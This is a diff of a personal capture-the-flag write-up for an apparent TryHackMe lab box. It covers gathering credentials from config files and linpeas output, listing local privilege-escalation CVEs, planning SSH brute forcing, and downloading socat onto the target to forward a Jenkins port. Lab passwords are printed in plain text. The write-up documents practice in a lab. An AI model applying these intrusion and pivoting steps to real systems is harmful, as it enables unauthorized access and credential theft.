@@ -109,9 +109,9 @@ spawn better shell and etc:
 i found this user called by "aubreanna" but i can't access your directory.
 ![](attachments/Pasted%20image%2020231022150311.png)
 
-a lot of files in /var/www/html/
+a lot of files in /var/www/html/ 
 ![](attachments/Pasted%20image%2020231022150519.png)
-i don't forget that this machine has a ssh open and mysql running into, so maybe can i leak some credentials?
+i don't forget this machine has a ssh open and mysql running into, so maybe can i leak some credentials?
 
 i'll use grep to see if there is some credentials or something like this
 
@@ -126,37 +126,68 @@ i'm found a binary in the snap folder called by "pppd" with suid permission that
 a lot of intersting things that linpeas found
 ![](attachments/Pasted%20image%2020231022153108.png)
 
+so now i have these credentials:
 
-$dbpass='B2Ud4fEOZmVq';
-$dbuser='phpmyadmin';
-define('DB_PASSWORD', 'wordpress123');
-define('DB_USER', 'wordpress');
+	ssh-loginUser='aubreanna';
+	ssh-loginPassword='bubb13guM!@#123';
+	wp-loginUser='admin';
+	wp-loginPass='my2boys';
+	$dbpass='B2Ud4fEOZmVq';
+	$dbuser='phpmyadmin';
+	define('DB_PASSWORD', 'wordpress123');
+	define('DB_USER', 'wordpress');
 
-
+nothing here...
 ![](attachments/Pasted%20image%2020231022153205.png)
-
+nothing here too..
 ![](attachments/Pasted%20image%2020231022153338.png)
 
-![](attachments/Pasted%20image%2020231022153244.png)
+pontentials cve's post exploitation:
 
-/usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-
-/snap/core/8268/usr/lib/snapd/snap-confine  --->  
-Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-
-/etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
-
-lrwxrwxrwx 1 root root 24 Aug  3  2020 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
--rw-r--r-- 1 root root 81 Aug  3  2020 /var/lib/dpkg/alternatives/my.cnf
-
-runc was found in /usr/sbin/runc, you may be able to escalate privileges with it
-ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it
-
-╔══════════╣ Analyzing Wordpress Files (limit 70)
--rw-r--r-- 1 root root 3109 Aug  3  2020 /var/www/html/wordpress/wp-config.php
-define( 'DB_NAME', 'wordpress' );
-define( 'DB_USER', 'wordpress' );
-define( 'DB_PASSWORD', 'wordpress123' );
-define( 'DB_HOST', 'localhost' );
+	/usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+	/snap/core/8268/usr/lib/snapd/snap-confine  ---> Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
 
 i'll organize and finish this room tomorrow but while the time of the room doesn't finish i'll try bruteforcing the user aubreanna in ssh :)
+
+now is a new day and yesterday i couldn't find "aubreanna" password :( but in phpmyadmin login page i got in with those credentials that i found before.
+
+![](attachments/Pasted%20image%2020231023063109.png)
+
+then, i have all information of the db and i can create or remove all tables if i want to. But i didn't find anything that help me to get an user or root.
+
+good news, reading linpeas scan and checking the files i found this:
+![](attachments/Pasted%20image%2020231022153244.png)
+![](attachments/Pasted%20image%2020231023071338.png)
+now i have one more credentials and a user privilege in the machine, i'll add in the list above ;)
+
+```bash
+$ ssh aubreanna@internal.thm
+```
+
+![](attachments/Pasted%20image%2020231023072931.png)
+good, got the first flag! and have this jenkins running locally.
+
+first i'll make a port forwarding to open this service and makes possible to access, if you want a explanation about port forwarding there is an notes that i made [notion-note](https://vivacious-church-b42.notion.site/port-forwarding-da3f15d4da6c4d06b2488687267165c2?pvs=4)
+
+```bash
+in my machine:
+$ sudo apt update && sudo apt install socat # help us to make the port forwarding but ssh can be used
+$ cd /usr/bin
+$ python3 -m http.server 8080
+
+in internal machine:
+$ wget http://127.0.0.1:8080/socat
+$ ./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:8080 &
+```
+
+and now the port 8888 is open:
+![](attachments/Pasted%20image%2020231023075622.png)
+
+![](attachments/Pasted%20image%2020231023075700.png)
+another login page! i'm going to die i swear bro.
+
+this site use cookies and i read before that jenkins can be exploited using cookies but first i'm gonna try access it with the credentials that i have.
+
+and...anyone works :(
+![](attachments/Pasted%20image%2020231023082133.png)
+ok, now i know that the version is 2.250
